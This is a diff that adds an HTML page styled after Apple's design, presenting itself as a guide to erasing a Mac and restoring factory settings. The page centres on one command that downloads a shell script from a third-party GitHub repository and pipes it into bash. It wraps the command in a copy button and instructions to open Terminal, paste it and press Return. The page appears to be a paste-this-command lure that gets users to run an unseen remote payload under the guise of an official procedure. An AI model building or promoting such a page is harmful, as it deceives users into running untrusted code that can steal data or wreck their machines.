@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Erase your Mac — Factory Reset via Terminal</title>
+  <meta name="description" content="Apple‑style guide to securely erase your Mac and restore factory settings using a single Terminal command. Includes copy button and safety checklist." />
+  <style>
+    :root{
+      --bg: #ffffff;
+      --card: #ffffff;
+      --text: #1d1d1f;
+      --muted:#6e6e73;
+      --link:#0071e3;
+      --border:#e5e5ea;
+      --accent:#0a84ff;
+      --warning:#ff453a;
+      --ok:#34c759;
+      --shadow: 0 10px 30px rgba(0,0,0,.06);
+      --radius: 18px;
+    }
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font:16px/1.6 -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif}
+    a{color:var(--link);text-decoration:none}
+    .container{max-width:980px;margin:0 auto;padding:24px}
+
+    /* Topbar */
+    .topbar{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:12px 0}
+    .brand{font-weight:600;letter-spacing:.2px}
+    .brand b{font-weight:700}
+    .toplinks a{color:var(--muted);margin-left:16px;font-size:.95rem}
+
+    /* Hero */
+    .hero{padding:56px 0 28px;text-align:center}
+    .eyebrow{font-weight:600;color:var(--muted);letter-spacing:.12em;text-transform:uppercase}
+    .title{margin:10px 0 12px;font-size:clamp(32px,5vw,54px);line-height:1.1;font-weight:700;letter-spacing:-.02em}
+    .subtitle{color:var(--muted);font-size:1.05rem}
+
+    .card{background:var(--card);border:1px solid var(--border);box-shadow:var(--shadow);border-radius:var(--radius);padding:24px}
+    .grid{display:grid;gap:24px}
+    @media(min-width:860px){.grid{grid-template-columns: 1.2fr .8fr}}
+
+    .checklist{list-style:none;padding:0;margin:0;display:grid;gap:10px}
+    .checklist li{display:flex;gap:12px;align-items:flex-start;border:1px solid var(--border);border-radius:14px;padding:14px;width:100%}
+    .tag{display:inline-block;padding:4px 10px;border-radius:999px;border:1px solid var(--border);color:var(--muted);font-size:.78rem;flex:0 0 92px;text-align:center;background:#fff}
+
+    .terminal{background:#0b0b0c;border:1px solid #1c1c1e;color:#e6e6e7;border-radius:14px;padding:14px;position:relative;font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace}
+    .term-row{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:10px}
+    .dots{display:flex;gap:8px}
+    .dot{width:10px;height:10px;border-radius:50%}
+    .dot.red{background:#ff5f56}
+    .dot.yellow{background:#ffbd2e}
+    .dot.green{background:#27c93f}
+    .code{overflow:auto;white-space:nowrap;font-size:.92rem}
+    .kbd{background:#1a1a1c;border:1px solid #2a2a2e;border-radius:8px;padding:8px}
+
+    .copywrap{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+    .button{appearance:none;background:var(--accent);color:#fff;border:none;border-radius:12px;padding:12px 16px;font-weight:600;cursor:not-allowed;opacity:.45;transition:transform .06s ease,opacity .2s ease}
+    .button.enabled{cursor:pointer;opacity:1}
+    .button:active{transform:translateY(1px)}
+    .button.secondary{background:transparent;color:var(--text);border:1px solid var(--border)}
+    .disclaimer{font-size:.95rem;color:var(--muted)}
+
+    details{border:1px solid var(--border);border-radius:14px;padding:12px}
+    details+details{margin-top:10px}
+    summary{cursor:pointer;font-weight:600}
+
+    .ack{display:flex;align-items:flex-start;gap:10px;margin:8px 0 2px}
+    .ack input{margin-top:4px}
+
+    .steps{counter-reset: step}
+    .step{border-top:1px solid var(--border);padding-top:18px;margin-top:18px}
+    .step h3{margin:0 0 6px}
+    .step h3::before{counter-increment: step; content: counter(step) ". "; color:var(--muted); font-weight:600}
+
+    footer{color:var(--muted);text-align:center;padding:28px 0}
+    .warn{color:var(--warning);font-weight:700}
+    .success{color:var(--ok);font-weight:700}
+
+    .figure{margin-top:16px;border:1px solid var(--border);border-radius:14px;overflow:hidden;box-shadow:var(--shadow)}
+    .figure img{width:100%;display:block}
+    .figure figcaption{font-size:.9rem;color:var(--muted);padding:8px 10px;text-align:center}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header class="topbar">
+      <div class="brand">Mac Guide <b>Reset</b></div>
+      <nav class="toplinks" aria-label="Secondary">
+        <a href="#checklist">Checklist</a>
+        <a href="#command">Command</a>
+        <a href="#faq">FAQ</a>
+      </nav>
+    </header>
+
+    <section class="hero">
+      <div class="eyebrow">Factory Reset</div>
+      <h1 class="title">Erase your Mac and restore it to factory settings</h1>
+      <p class="subtitle">Use one Terminal command to securely erase your Mac. Read the checklist carefully — this process is destructive and cannot be undone.</p>
+    </section>
+
+    <section class="grid" id="checklist">
+
+      <aside class="card" id="command">
+        <div class="terminal" role="region" aria-label="Terminal window">
+          <div class="term-row">
+            <div class="dots" aria-hidden="true">
+              <div class="dot red"></div>
+              <div class="dot yellow"></div>
+              <div class="dot green"></div>
+            </div>
+            <div class="kbd">Shell — bash</div>
+          </div>
+          <div class="code" id="codeText">/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/macos-erase-guides/erase/refs/heads/main/erase.sh)"</div>
+        </div>
+
+        <label class="ack">
+          <input type="checkbox" id="confirm" />
+          <span>I understand this will <span class="warn">erase all data</span> on this Mac and reinstall macOS.</span>
+        </label>
+
+        <div class="copywrap">
+          <button id="copyBtn" class="button" disabled>Copy command</button>
+          <button id="openTerminalBtn" class="button secondary">Open Terminal steps</button>
+          <span id="copyState" class="disclaimer" role="status" aria-live="polite"></span>
+        </div>
+
+        <div class="steps" id="run" style="margin-top:16px">
+          <h2 style="margin:12px 0">Run the command</h2>
+          <div class="step">
+            <h3>Open Terminal</h3>
+            <p>Press <strong>⌘ Space</strong>, type <strong>Terminal</strong>, and press <strong>Return</strong>. Or go to <em>Applications → Utilities → Terminal</em>.</p>
+          </div>
+          <div class="step">
+            <h3>Paste and run</h3>
+            <p>Click <em>Copy command</em> above, paste with <strong>⌘ V</strong> into Terminal, then press <strong>Return</strong>.</p>
+          </div>
+          <div class="step">
+            <h3>Follow on‑screen prompts</h3>
+            <p>Keep your Mac connected to power. When finished, it restarts to the setup assistant.</p>
+          </div>
+        </div>
+        <figure class="figure"><img src="https://mac.eltima.com/wp-content/uploads/2024/02/terminal_spotlight.jpg" alt="How to open Terminal on macOS via Spotlight" /><figcaption>Open Spotlight → type “Terminal” → press Return.</figcaption></figure>
+      </aside>
+    </section>
+
+    <section id="faq" style="margin-top:18px">
+      <div class="card">
+        <h2 style="margin:0 0 12px">Notes & FAQs</h2>
+        <details>
+          <summary>Will this remove my Apple ID activation lock?</summary>
+          <p>Erasing does not remove Activation Lock if Find My is enabled and you remain signed in. Sign out of iCloud first.</p>
+        </details>
+        <details>
+          <summary>How long does it take?</summary>
+          <p>Time varies by storage size and network speed. Plan for 15–60 minutes in most cases, longer for large disks.</p>
+        </details>
+        <details>
+          <summary>What if I changed my mind?</summary>
+          <p>If you haven’t run the command, simply close Terminal. Once the erase starts, it can’t be undone.</p>
+        </details>
+      </div>
+    </section>
+
+    <footer>
+      <p>This is an independent guide styled like Apple interfaces. Proceed at your own risk.</p>
+    </footer>
+  </div>
+
+  <script>
+    (function(){
+      const confirmBox = document.getElementById('confirm');
+      const copyBtn = document.getElementById('copyBtn');
+      const openTerminalBtn = document.getElementById('openTerminalBtn');
+      const codeText = document.getElementById('codeText').innerText.trim();
+      const state = document.getElementById('copyState');
+
+      function setEnabled(on){
+        if(on){
+          copyBtn.removeAttribute('disabled');
+          copyBtn.classList.add('enabled');
+          copyBtn.classList.remove('disabled');
+        }else{
+          copyBtn.setAttribute('disabled','');
+          copyBtn.classList.remove('enabled');
+        }
+      }
+      setEnabled(false);
+
+      confirmBox.addEventListener('change', e => setEnabled(!!e.target.checked));
+
+      copyBtn.addEventListener('click', async () => {
+        try{
+          await navigator.clipboard.writeText(codeText);
+          state.textContent = 'Command copied to clipboard.';
+        }catch(err){
+          state.textContent = 'Copy failed. Select and copy manually.';
+        }
+      });
+
+      openTerminalBtn.addEventListener('click', () => {
+        alert('Open Spotlight (⌘ Space) → type “Terminal” → Return. Then paste the command and press Return.');
+      });
+    })();
+  </script>
+</body>
+</html>
